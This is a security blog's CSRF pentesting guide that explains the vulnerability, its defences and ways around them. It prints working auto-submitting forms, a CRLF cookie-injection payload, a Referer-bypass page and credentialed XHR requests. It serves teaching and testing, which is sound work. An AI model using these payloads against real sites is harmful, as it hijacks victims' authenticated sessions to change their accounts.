<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> CSRF (Cross Site Request Forgery) | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-csrf-cross-site-request-forgery/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">CSRF (Cross Site Request Forgery)</h1> <p class="post-description"></p> </header> <article> <h1 id="csrf-cross-site-request-forgery">CSRF (Cross Site Request Forgery)</h1> <h2 id="cross-site-request-forgery-csrf-explained">Cross-Site Request Forgery (CSRF) Explained</h2> <p><strong>Cross-Site Request Forgery (CSRF)</strong> is a type of security vulnerability found in web applications. It enables attackers to perform actions on behalf of unsuspecting users by exploiting their authenticated sessions. The attack is executed when a user, who is logged into a victim’s platform, visits a malicious site. This site then triggers requests to the victim’s account through methods like executing JavaScript, submitting forms, or fetching images.</p> <h3 id="prerequisites-for-a-csrf-attack">Prerequisites for a CSRF Attack</h3> <p>To exploit a CSRF vulnerability, several conditions must be met:</p> <ol> <li> <strong>Identify a Valuable Action</strong>: The attacker needs to find an action worth exploiting, such as changing the user’s password, email, or elevating privileges.</li> <li> <strong>Session Management</strong>: The user’s session should be managed solely through cookies or the HTTP Basic Authentication header, as other headers cannot be manipulated for this purpose.</li> <li> <strong>Absence of Unpredictable Parameters</strong>: The request should not contain unpredictable parameters, as they can prevent the attack.</li> </ol> <h3 id="quick-check">Quick Check</h3> <p>You could <strong>capture the request in Burp</strong> and check CSRF protections and to test from the bowser you can click on <strong>Copy as fetch</strong> and check the request:</p> <figure><img src="../images/image%20(11)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure> <h3 id="defending-against-csrf">Defending Against CSRF</h3> <p>Several countermeasures can be implemented to protect against CSRF attacks:</p> <ul> <li> <a href="hacking-with-cookies/index.html#samesite"><strong>SameSite cookies</strong></a>: This attribute prevents the browser from sending cookies along with cross-site requests. <a href="hacking-with-cookies/index.html#samesite">More about SameSite cookies</a>.</li> <li> <a href="cors-bypass.md"><strong>Cross-origin resource sharing</strong></a>: The CORS policy of the victim site can influence the feasibility of the attack, especially if the attack requires reading the response from the victim site. <a href="cors-bypass.md">Learn about CORS bypass</a>.</li> <li> <strong>User Verification</strong>: Prompting for the user’s password or solving a captcha can confirm the user’s intent.</li> <li> <strong>Checking Referrer or Origin Headers</strong>: Validating these headers can help ensure requests are coming from trusted sources. However, careful crafting of URLs can bypass poorly implemented checks, such as: <ul> <li>Using <code class="language-plaintext highlighter-rouge">http://mal.net?orig=http://example.com</code> (URL ends with the trusted URL)</li> <li>Using <code class="language-plaintext highlighter-rouge">http://example.com.mal.net</code> (URL starts with the trusted URL)</li> </ul> </li> <li> <strong>Modifying Parameter Names</strong>: Altering the names of parameters in POST or GET requests can help in preventing automated attacks.</li> <li> <strong>CSRF Tokens</strong>: Incorporating a unique CSRF token in each session and requiring this token in subsequent requests can significantly mitigate the risk of CSRF. The effectiveness of the token can be enhanced by enforcing CORS.</li> </ul> <p>Understanding and implementing these defenses is crucial for maintaining the security and integrity of web applications.</p> <h2 id="defences-bypass">Defences Bypass</h2> <h3 id="from-post-to-get">From POST to GET</h3> <p>Maybe the form you want to abuse is prepared to send a <strong>POST request with a CSRF token but</strong>, you should <strong>check</strong> if a <strong>GET</strong> is also <strong>valid</strong> and if when you send a GET request the <strong>CSRF token is still being validated</strong>.</p> <h3 id="lack-of-token">Lack of token</h3> <p>Applications might implement a mechanism to <strong>validate tokens</strong> when they are present. However, a vulnerability arises if the validation is skipped altogether when the token is absent. Attackers can exploit this by <strong>removing the parameter</strong> that carries the token, not just its value. This allows them to circumvent the validation process and conduct a Cross-Site Request Forgery (CSRF) attack effectively.</p> <h3 id="csrf-token-is-not-tied-to-the-user-session">CSRF token is not tied to the user session</h3> <p>Applications <strong>not tying CSRF tokens to user sessions</strong> present a significant <strong>security risk</strong>. These systems verify tokens against a <strong>global pool</strong> rather than ensuring each token is bound to the initiating session.</p> <p>Here’s how attackers exploit this:</p> <ol> <li> <strong>Authenticate</strong> using their own account.</li> <li> <strong>Obtain a valid CSRF token</strong> from the global pool.</li> <li> <strong>Use this token</strong> in a CSRF attack against a victim.</li> </ol> <p>This vulnerability allows attackers to make unauthorized requests on behalf of the victim, exploiting the application’s <strong>inadequate token validation mechanism</strong>.</p> <h3 id="method-bypass">Method bypass</h3> <p>If the request is using a “<strong>weird</strong>” <strong>method</strong>, check if the <strong>method</strong> <strong>override functionality</strong> is working. For example, if it’s <strong>using a PUT</strong> method you can try to <strong>use a POST</strong> method and <strong>send</strong>: <em>https://example.com/my/dear/api/val/num?<strong>_method=PUT</strong></em></p> <p>This could also works sending the <strong>_method parameter inside the a POST request</strong> or using the <strong>headers</strong>:</p> <ul> <li><em>X-HTTP-Method</em></li> <li><em>X-HTTP-Method-Override</em></li> <li><em>X-Method-Override</em></li> </ul> <h3 id="custom-header-token-bypass">Custom header token bypass</h3> <p>If the request is adding a <strong>custom header</strong> with a <strong>token</strong> to the request as <strong>CSRF protection method</strong>, then:</p> <ul> <li>Test the request without the <strong>Customized Token and also header.</strong> </li> <li>Test the request with exact <strong>same length but different token</strong>.</li> </ul> <h3 id="csrf-token-is-verified-by-a-cookie">CSRF token is verified by a cookie</h3> <p>Applications may implement CSRF protection by duplicating the token in both a cookie and a request parameter or by setting a CSRF cookie and verifying if the token sent in the backend corresponds to the cookie. The application validates requests by checking if the token in the request parameter aligns with the value in the cookie.</p> <p>However, this method is vulnerable to CSRF attacks if the website has flaws allowing an attacker to set a CSRF cookie in the victim’s browser, such as a CRLF vulnerability. The attacker can exploit this by loading a deceptive image that sets the cookie, followed by initiating the CSRF attack.</p> <p>Below is an example of how an attack could be structured:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="c">&lt;!-- CSRF Proof of Concept - generated by Burp Suite Professional --&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://example.com/my-account/change-email"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"asd&amp;#64;asd&amp;#46;asd"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"</span> <span class="na">onerror=</span><span class="s">"document.forms[0].submit();"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <blockquote> <p>[!NOTE] Note that if the <strong>csrf token is related with the session cookie this attack won’t work</strong> because you will need to set the victim your session, and therefore you will be attacking yourself.</p> </blockquote> <h3 id="content-type-change">Content-Type change</h3> <p>According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests" rel="external nofollow noopener" target="_blank"><strong>this</strong></a>, in order to <strong>avoid preflight</strong> requests using <strong>POST</strong> method these are the allowed Content-Type values:</p> <ul> <li><strong><code class="language-plaintext highlighter-rouge">application/x-www-form-urlencoded</code></strong></li> <li><strong><code class="language-plaintext highlighter-rouge">multipart/form-data</code></strong></li> <li><strong><code class="language-plaintext highlighter-rouge">text/plain</code></strong></li> </ul> <p>However, note that the <strong>severs logic may vary</strong> depending on the <strong>Content-Type</strong> used so you should try the values mentioned and others like <strong><code class="language-plaintext highlighter-rouge">application/json</code></strong><em><strong>,</strong></em><strong><code class="language-plaintext highlighter-rouge">text/xml</code></strong>, <strong><code class="language-plaintext highlighter-rouge">application/xml</code></strong><em>.</em></p> <p>Example (from <a href="https://brycec.me/posts/corctf_2021_challenges" rel="external nofollow noopener" target="_blank">here</a>) of sending JSON data as text/plain:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"form"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"https://phpme.be.ax/"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">'{"garbageeeee":"'</span> <span class="na">value=</span><span class="s">'", "yep": "yep yep yep", "url": "https://webhook/"}'</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nx">form</span><span class="p">.</span><span class="nf">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <h3 id="bypassing-preflight-requests-for-json-data">Bypassing Preflight Requests for JSON Data</h3> <p>When attempting to send JSON data via a POST request, using the <code class="language-plaintext highlighter-rouge">Content-Type: application/json</code> in an HTML form is not directly possible. Similarly, utilizing <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> to send this content type initiates a preflight request. Nonetheless, there are strategies to potentially bypass this limitation and check if the server processes the JSON data irrespective of the Content-Type:</p> <ol> <li> <strong>Use Alternative Content Types</strong>: Employ <code class="language-plaintext highlighter-rouge">Content-Type: text/plain</code> or <code class="language-plaintext highlighter-rouge">Content-Type: application/x-www-form-urlencoded</code> by setting <code class="language-plaintext highlighter-rouge">enctype="text/plain"</code> in the form. This approach tests if the backend utilizes the data regardless of the Content-Type.</li> <li> <strong>Modify Content Type</strong>: To avoid a preflight request while ensuring the server recognizes the content as JSON, you can send the data with <code class="language-plaintext highlighter-rouge">Content-Type: text/plain; application/json</code>. This doesn’t trigger a preflight request but might be processed correctly by the server if it’s configured to accept <code class="language-plaintext highlighter-rouge">application/json</code>.</li> <li> <strong>SWF Flash File Utilization</strong>: A less common but feasible method involves using an SWF flash file to bypass such restrictions. For an in-depth understanding of this technique, refer to <a href="https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937" rel="external nofollow noopener" target="_blank">this post</a>.</li> </ol> <h3 id="referrer--origin-check-bypass">Referrer / Origin check bypass</h3> <p><strong>Avoid Referrer header</strong></p> <p>Applications may validate the ‘Referer’ header only when it’s present. To prevent a browser from sending this header, the following HTML meta tag can be used:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"never"</span><span class="nt">&gt;</span>
</code></pre></div></div> <p>This ensures the ‘Referer’ header is omitted, potentially bypassing validation checks in some applications.</p> <p><strong>Regexp bypasses</strong></p> <p>ssrf-server-side-request-forgery/url-format-bypass.md</p> <p>To set the domain name of the server in the URL that the Referrer is going to send inside the parameters you can do:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="c">&lt;!-- Referrer policy needed to send the qury parameter in the referrer --&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"unsafe-url"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"asd&amp;#64;asd&amp;#46;asd"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="c1">// You need to set this or the domain won't appear in the query of the referer header</span>
      <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net</span><span class="dl">"</span><span class="p">);</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <h3 id="head-method-bypass"><strong>HEAD method bypass</strong></h3> <p>The first part of <a href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution" rel="external nofollow noopener" target="_blank"><strong>this CTF writeup</strong></a> is explained that <a href="https://github.com/oakserver/oak/blob/main/router.ts#L281" rel="external nofollow noopener" target="_blank">Oak’s source code</a>, a router is set to <strong>handle HEAD requests as GET requests</strong> with no response body - a common workaround that isn’t unique to Oak. Instead of a specific handler that deals with HEAD reqs, they’re simply <strong>given to the GET handler but the app just removes the response body</strong>.</p> <p>Therefore, if a GET request is being limited, you could just <strong>send a HEAD request that will be processed as a GET request</strong>.</p> <h2 id="exploit-examples"><strong>Exploit Examples</strong></h2> <h3 id="exfiltrating-csrf-token"><strong>Exfiltrating CSRF Token</strong></h3> <p>If a <strong>CSRF token</strong> is being used as <strong>defence</strong> you could try to <strong>exfiltrate it</strong> abusing a <a href="xss-cross-site-scripting/index.html#xss-stealing-csrf-tokens"><strong>XSS</strong></a> vulnerability or a <a href="dangling-markup-html-scriptless-injection/index.html"><strong>Dangling Markup</strong></a> vulnerability.</p> <h3 id="get-using-html-tags"><strong>GET using HTML tags</strong></h3> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://google.es?param=VALUE"</span> <span class="na">style=</span><span class="s">"display:none"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;h1&gt;</span>404 - Page not found<span class="nt">&lt;/h1&gt;</span>
The URL you are requesting is no longer available
</code></pre></div></div> <p>Other HTML5 tags that can be used to automatically send a GET request are:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"..."</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"..."</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"..."</span> <span class="na">alt=</span><span class="s">""</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;embed</span> <span class="na">src=</span><span class="s">"..."</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;audio</span> <span class="na">src=</span><span class="s">"..."</span><span class="nt">&gt;</span>
  <span class="nt">&lt;video</span> <span class="na">src=</span><span class="s">"..."</span><span class="nt">&gt;</span>
    <span class="nt">&lt;source</span> <span class="na">src=</span><span class="s">"..."</span> <span class="na">type=</span><span class="s">"..."</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;video</span> <span class="na">poster=</span><span class="s">"..."</span><span class="nt">&gt;</span>
      <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"..."</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;object</span> <span class="na">data=</span><span class="s">"..."</span><span class="nt">&gt;</span>
        <span class="nt">&lt;body</span> <span class="na">background=</span><span class="s">"..."</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background: url('...');"</span><span class="nt">&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;style&gt;</span>
            <span class="nt">body</span> <span class="p">{</span>
              <span class="nl">background</span><span class="p">:</span> <span class="sx">url("...")</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="nt">&lt;/style&gt;</span>
          <span class="nt">&lt;bgsound</span> <span class="na">src=</span><span class="s">"..."</span><span class="nt">&gt;</span>
            <span class="nt">&lt;track</span> <span class="na">src=</span><span class="s">"..."</span> <span class="na">kind=</span><span class="s">"subtitles"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"image"</span> <span class="na">src=</span><span class="s">"..."</span> <span class="na">alt=</span><span class="s">"Submit Button"</span>
          <span class="nt">/&gt;&lt;/bgsound&gt;</span>
        <span class="nt">&lt;/body&gt;</span>
      <span class="nt">&lt;/object&gt;</span>
    <span class="nt">&lt;/video&gt;</span>
  <span class="nt">&lt;/video&gt;</span>
<span class="nt">&lt;/audio&gt;</span>
</code></pre></div></div> <h3 id="form-get-request">Form GET request</h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="c">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">"https://victim.net/email/change-email"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"some@email.com"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <h3 id="form-post-request">Form POST request</h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://victim.net/email/change-email"</span> <span class="na">id=</span><span class="s">"csrfform"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"some@email.com"</span> <span class="na">autofocus</span> <span class="na">onfocus=</span><span class="s">"csrfform.submit();"</span> <span class="nt">/&gt;</span>
      <span class="c">&lt;!-- Way 1 to autosubmit --&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"x"</span> <span class="na">onerror=</span><span class="s">"csrfform.submit();"</span> <span class="nt">/&gt;</span>
      <span class="c">&lt;!-- Way 2 to autosubmit --&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span> <span class="c1">//Way 3 to autosubmit</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <h3 id="form-post-request-through-iframe">Form POST request through iframe</h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 
The request is sent through the iframe withuot reloading the page 
--&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none"</span> <span class="na">name=</span><span class="s">"csrfframe"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"/change-email"</span> <span class="na">id=</span><span class="s">"csrfform"</span> <span class="na">target=</span><span class="s">"csrfframe"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"some@email.com"</span> <span class="na">autofocus</span> <span class="na">onfocus=</span><span class="s">"csrfform.submit();"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <h3 id="ajax-post-request"><strong>Ajax POST request</strong></h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
  <span class="kd">var</span> <span class="nx">xh</span><span class="p">;</span>
  <span class="k">if </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// code for IE7+, Firefox, Chrome, Opera, Safari</span>
    <span class="nx">xh</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// code for IE6, IE5</span>
    <span class="nx">xh</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">Microsoft.XMLHTTP</span><span class="dl">"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="nx">xh</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="nx">xh</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://challenge01.root-me.org/web-client/ch22/?action=profile</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">xh</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//to send proper header info (optional, but good to have as it may sometimes not work without this)</span>
  <span class="nx">xh</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">username=abcd&amp;status=on</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;script&gt;</span>
  <span class="c1">//JQuery version</span>
  <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
    <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">param=value&amp;param2=value2</span><span class="dl">"</span><span class="p">,</span>
  <span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
